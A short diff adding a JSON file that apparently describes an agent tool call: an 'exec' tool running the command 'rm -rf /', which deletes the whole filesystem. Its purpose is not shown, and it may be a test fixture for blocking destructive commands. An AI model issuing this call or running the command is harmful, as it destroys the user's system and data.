@@ -1,0 +1,4 @@
+{
+  "tool": "exec",
+  "command": "rm -rf /"
+}
